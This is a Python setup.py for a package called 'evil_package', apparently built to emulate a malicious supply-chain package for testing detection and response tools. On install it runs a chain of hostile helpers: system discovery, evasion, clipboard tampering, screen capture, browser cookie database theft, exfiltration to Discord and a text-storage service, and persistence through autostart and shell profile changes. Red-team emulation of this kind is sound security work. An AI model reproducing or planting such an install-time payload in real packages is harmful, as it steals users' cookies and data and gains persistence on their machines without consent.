from setuptools import setup, find_packages
import platform


from tests.discovery import get_os_info
from tests.evasion import run_evasion_tests
from tests.collection import clipboard_data_alternation
from tests.collection import screen_capture
from tests.collection import steel_cookie_db
from tests.execution import run_process
from tests.exfiltration import exfil_discord
from tests.exfiltration import exfil_textstorage
from tests.persistense import drop_config_autostart
from tests.persistense import drop_profile_modification
from tests.persistense import drop_schtask_autostart

platform_str = platform.system()  # 'Linux' , 'Darwin' , 'Java' , 'Windows'
print("Info: evil_package starting to run for platform " + platform_str)


# discovery
username = get_os_info(platform_str)


# evasion
run_evasion_tests(platform_str)

# collection
clipboard_data_alternation(platform_str) #ok darvin
screen_capture(platform_str) #ok darvin
steel_cookie_db(platform_str, username) #ok darvin

# execution
run_process(platform_str) #ok darvin

# exfiltration
exfil_discord(platform_str)  # todo
exfil_textstorage(platform_str)  # todo

# persistense
drop_config_autostart(platform_str, username)  # todo test lin
drop_profile_modification(platform_str, username)  # todo test lin
#drop_schtask_autostart(platform_str)  # todo win

print("INFO: Package activity finished.")

setup(
    name='evil_package',
    version='0.0.2',
    description='Python package for testing the detection and response',
    url='https://github.com/petermat/evil-package',
    author='Peter Matkovski',
    author_email='p.matkovski@gmail.com',
    license='BSD 2-clause',
    packages=find_packages(),
    #packages=['distutils'],
    #package_dir={'evil_package': ''},
    #install_requires=['shutil',
    #                  'threading'],
    #package_data= ,
     package_data={
        'tests': ['*.*'],  # Include all files in the tests package
    },
    #exclude_package_data=,
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Science/Research',
        'License :: OSI Approved :: BSD License',
        'Operating System :: MacOS',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: POSIX',
        'Programming Language :: Python :: 3',
    ],
)
